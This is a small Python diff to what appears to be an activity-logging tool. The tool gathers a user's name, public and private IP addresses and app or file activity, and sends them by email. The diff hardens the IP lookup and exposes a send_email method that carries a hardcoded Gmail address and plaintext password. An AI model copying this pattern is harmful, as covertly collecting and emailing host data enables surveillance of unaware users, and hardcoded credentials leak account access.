@@ -37,6 +37,7 @@ class Logger:
         self.old_app = ''
         self.old_file = ''
         self.user = ''
+        self.public_ip = ''
         self.tracks = []
         self.track_hashes = []
         self.queue = queue
@@ -44,8 +45,13 @@ class Logger:
         if sys.platform in ['Windows', 'win32', 'cygwin']:
             self.user = os.path.expanduser('~').split("\\")[2]
 
+        try:
+            self.public_ip = requests.get('https://api.ipify.org/').text
+        except Exception as msg:
+            print(msg)
+
         # Create instance of the UserModel class
-        self.User = UserModel(public_IP=requests.get('https://api.ipify.org/').text,
+        self.User = UserModel(public_IP=self.public_ip,
                               private_IP=socket.gethostbyname(socket.gethostname()),
                               user=self.user,
                               )
@@ -190,7 +196,7 @@ class Logger:
                 print("Event finished")
                 break
 
-    def __send_email(self):
+    def send_email(self):
         sender_email = "firstdjin@gmail.com"
         receiver_email = "firstdjin@gmail.com"
         password = "djin1234"
